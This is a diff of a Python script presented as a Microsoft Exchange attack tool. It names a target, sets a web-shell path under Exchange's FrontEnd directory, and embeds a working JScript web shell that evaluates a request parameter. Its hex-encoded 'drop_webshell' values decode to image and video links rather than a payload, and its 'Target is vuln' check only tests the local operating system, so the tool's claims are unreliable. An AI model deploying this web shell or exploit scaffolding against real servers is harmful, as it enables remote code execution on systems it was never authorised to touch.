@@ -22,7 +22,7 @@ shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProx
 shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path
 
 shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["exec_code"],"unsafe");}</script>'
-legacyDnPatchByte = "68747470733a2f2f696d6775722e636f6d2f612f7a54646e5378670a0a0a0a0a0a0a0a"
+legacyDnPatchByte = "68747470733A2F2F7777772E796F75747562652E636F6D2F77617463683F763D6451773477395767586351"
 autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
     <Request>
       <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
@@ -33,7 +33,7 @@ autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange
 print("Attacking target " + target)
 print("=============================")
 shell_name = 'chinachopper.aspx'
-drop_webshell = '68747470733A2F2F7777772E796F75747562652E636F6D2F77617463683F763D6451773477395767586351'
+drop_webshell = legacyDnPatchByte
 exec_webshell = bytearray.fromhex(drop_webshell).decode()
 if os.name == 'nt':
 	print('(+) Target is vuln')
